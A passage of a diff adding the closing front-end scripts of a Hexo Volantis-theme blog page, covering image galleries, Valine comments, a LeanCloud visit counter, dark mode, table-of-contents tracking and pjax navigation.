+		HEAD.appendChild(script);
+	});
+}
+//https://github.com/filamentgroup/loadCSS
+var loadCSS = function( href, before, media, attributes ){
+	var doc = window.document;
+	var ss = doc.createElement( "link" );
+	var ref;
+	if( before ){
+		ref = before;
+	}
+	else {
+		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
+		ref = refs[ refs.length - 1];
+	}
+	var sheets = doc.styleSheets;
+	if( attributes ){
+		for( var attributeName in attributes ){
+			if( attributes.hasOwnProperty( attributeName ) ){
+				ss.setAttribute( attributeName, attributes[attributeName] );
+			}
+		}
+	}
+	ss.rel = "stylesheet";
+	ss.href = href;
+	ss.media = "only x";
+	function ready( cb ){
+		if( doc.body ){
+			return cb();
+		}
+		setTimeout(function(){
+			ready( cb );
+		});
+	}
+	ready( function(){
+		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
+	});
+	var onloadcssdefined = function( cb ){
+		var resolvedHref = ss.href;
+		var i = sheets.length;
+		while( i-- ){
+			if( sheets[ i ].href === resolvedHref ){
+				return cb();
+			}
+		}
+		setTimeout(function() {
+			onloadcssdefined( cb );
+		});
+	};
+	function loadCB(){
+		if( ss.addEventListener ){
+			ss.removeEventListener( "load", loadCB );
+		}
+		ss.media = media || "all";
+	}
+	if( ss.addEventListener ){
+		ss.addEventListener( "load", loadCB);
+	}
+	ss.onloadcssdefined = onloadcssdefined;
+	onloadcssdefined( loadCB );
+	return ss;
+};
+</script>
+<script>
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
+  
+  
+  
+  
+</script>
+<!-- required -->
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+<script>
+  function pjax_fancybox() {
+    $(".md .gallery").find("img").each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".md .gallery").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  function SCload_fancybox() {
+    if ($(".md .gallery").find("img").length == 0) return;
+    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
+    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
+  };
+  $(function () {
+    SCload_fancybox();
+  });
+  function Pjax_SCload_fancybox(){
+	if (typeof $.fancybox == "undefined") {
+	 SCload_fancybox();
+    } else {
+	 pjax_fancybox();
+    }
+  }
+  volantis.pjax.push(Pjax_SCload_fancybox)
+  volantis.pjax.send(()=>{
+      if (typeof $.fancybox != "undefined") {
+        $.fancybox.close();    // 关闭弹窗
+      }
+  },'fancybox')
+</script>
+
+
+<!-- internal -->
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+	  function Pjax_backstretch(){
+        
+          $.backstretch(
+            imgs,
+          {
+            duration: "10000",
+            fade: "1500"
+          });
+        
+	  }
+	  loadScript("https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js",Pjax_backstretch)
+    </script>
+  
+
+
+
+
+<script>
+  function loadIssuesJS() {
+    if ($(".md").find(".issues-api").length == 0) return;
+	
+	  loadScript('/js/issues.js');
+	
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  volantis.pjax.push(()=>{
+	if (typeof IssuesAPI == "undefined") {
+	  loadIssuesJS();
+	}
+  },"IssuesJS")
+</script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+
+<script>
+  window.FPConfig = {
+	delay: 0,
+	ignoreKeywords: [],
+	maxRPS: 5,
+	hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+  function pjax_valine() {
+    if(!document.querySelectorAll("#valine_container")[0])return;
+    let pagePlaceholder = pdata.commentPlaceholder || "快来评论吧~";
+    let path = pdata.commentPath;
+    if (path.length == 0) {
+      let defaultPath = '';
+      path = defaultPath || decodeURI(window.location.pathname);
+    }
+    var valine = new Valine();
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+      el: '#valine_container',
+      path: path,
+      placeholder: pagePlaceholder,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps,
+    }))
+  }
+  $(function () {
+    pjax_valine();
+  });
+  volantis.pjax.push(pjax_valine);
+</script>
+
+
+
+
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+<!-- optional -->
+
+  <script>
+const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
+const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
+
+$('.input.u-search-input').one('focus',function(){
+	
+		loadScript('https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js',setSearchService);
+	
+})
+
+function listenSearch(){
+  
+    customSearch = new HexoSearch({
+      imagePath: SearchServiceimagePath
+    });
+  
+}
+function setSearchService() {
+	listenSearch();
+	
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz',
+    app_key: '9HlyBGu0qm9EmkSNKD2qoBx4',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://www.bycsec.top' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://www.bycsec.top' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://www.bycsec.top' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
+
+
+  <script>
+const rootElement = document.documentElement;
+const darkModeStorageKey = "user-color-scheme";
+const rootElementDarkModeAttributeName = "data-user-color-scheme";
+
+const setLS = (k, v) => {
+    localStorage.setItem(k, v);
+};
+
+const removeLS = (k) => {
+    localStorage.removeItem(k);
+};
+
+const getLS = (k) => {
+    return localStorage.getItem(k);
+};
+
+const getModeFromCSSMediaQuery = () => {
+  return window.matchMedia("(prefers-color-scheme: dark)").matches
+    ? "dark"
+    : "light";
+};
+
+const resetRootDarkModeAttributeAndLS = () => {
+  rootElement.removeAttribute(rootElementDarkModeAttributeName);
+  removeLS(darkModeStorageKey);
+};
+
+const validColorModeKeys = {
+  dark: true,
+  light: true,
+};
+
+const applyCustomDarkModeSettings = (mode) => {
+  const currentSetting = mode || getLS(darkModeStorageKey);
+
+  if (currentSetting === getModeFromCSSMediaQuery()) {
+    resetRootDarkModeAttributeAndLS();
+  } else if (validColorModeKeys[currentSetting]) {
+    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
+  } else {
+    resetRootDarkModeAttributeAndLS();
+  }
+};
+
+const invertDarkModeObj = {
+  dark: "light",
+  light: "dark",
+};
+
+/**
+ * get target mode
+ */
+const toggleCustomDarkMode = () => {
+  let currentSetting = getLS(darkModeStorageKey);
+
+  if (validColorModeKeys[currentSetting]) {
+    currentSetting = invertDarkModeObj[currentSetting];
+  } else if (currentSetting === null) {
+    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
+  } else {
+    return;
+  }
+  setLS(darkModeStorageKey, currentSetting);
+  return currentSetting;
+};
+
+/**
+ * bind click event for toggle button
+ */
+var btn=$("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn");
+function bindToggleButton() {
+    btn.on('click',(e) => {
+      const mode = toggleCustomDarkMode();
+      applyCustomDarkModeSettings(mode);
+    });
+}
+
+applyCustomDarkModeSettings();
+document.addEventListener("DOMContentLoaded", bindToggleButton);
+volantis.pjax.push(bindToggleButton);
+volantis.pjax.send(()=>{
+	btn.unbind('click');
+},'toggle-mode-btn-unbind');
+</script>
+
+
+
+
+
+
+
+
+<script>
+function listennSidebarTOC() {
+  const navItems = document.querySelectorAll(".toc li");
+  if (!navItems.length) return;
+  const sections = [...navItems].map((element) => {
+    const link = element.querySelector(".toc-link");
+    const target = document.getElementById(
+      decodeURI(link.getAttribute("href")).replace("#", "")
+    );
+    link.addEventListener("click", (event) => {
+      event.preventDefault();
+      window.scrollTo({
+		top: target.offsetTop + 100,
+		
+		behavior: "smooth"
+		
+	  });
+    });
+    return target;
+  });
+
+  function activateNavByIndex(target) {
+    if (target.classList.contains("active-current")) return;
+
+    document.querySelectorAll(".toc .active").forEach((element) => {
+      element.classList.remove("active", "active-current");
+    });
+    target.classList.add("active", "active-current");
+    let parent = target.parentNode;
+    while (!parent.matches(".toc")) {
+      if (parent.matches("li")) parent.classList.add("active");
+      parent = parent.parentNode;
+    }
+  }
+
+  function findIndex(entries) {
+    let index = 0;
+    let entry = entries[index];
+    if (entry.boundingClientRect.top > 0) {
+      index = sections.indexOf(entry.target);
+      return index === 0 ? 0 : index - 1;
+    }
+    for (; index < entries.length; index++) {
+      if (entries[index].boundingClientRect.top <= 0) {
+        entry = entries[index];
+      } else {
+        return sections.indexOf(entry.target);
+      }
+    }
+    return sections.indexOf(entry.target);
+  }
+
+  function createIntersectionObserver(marginTop) {
+    marginTop = Math.floor(marginTop + 10000);
+    let intersectionObserver = new IntersectionObserver(
+      (entries, observe) => {
+        let scrollHeight = document.documentElement.scrollHeight + 100;
+        if (scrollHeight > marginTop) {
+          observe.disconnect();
+          createIntersectionObserver(scrollHeight);
+          return;
+        }
+        let index = findIndex(entries);
+        activateNavByIndex(navItems[index]);
+      },
+      {
+        rootMargin: marginTop + "px 0px -100% 0px",
+        threshold: 0,
+      }
+    );
+    sections.forEach((element) => {
+      element && intersectionObserver.observe(element);
+    });
+  }
+  createIntersectionObserver(document.documentElement.scrollHeight);
+}
+
+document.addEventListener("DOMContentLoaded", listennSidebarTOC);
+document.addEventListener("pjax:success", listennSidebarTOC);
+</script>
+
+<!-- more -->
+
+ 
+	   
+	    
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+
+      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
+      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      volantis.$topBtn.unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.send.start();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+      try{
+		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
+		volantis.pjax.method.complete.start();
+      } catch (e) {
+        console.log(e);
+      }
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.error.start();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+ 
+	  
+    </div>
+  </body>
+</html>
